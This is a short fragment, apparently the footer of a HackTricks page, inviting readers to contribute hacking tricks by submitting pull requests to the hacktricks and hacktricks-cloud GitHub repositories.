* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
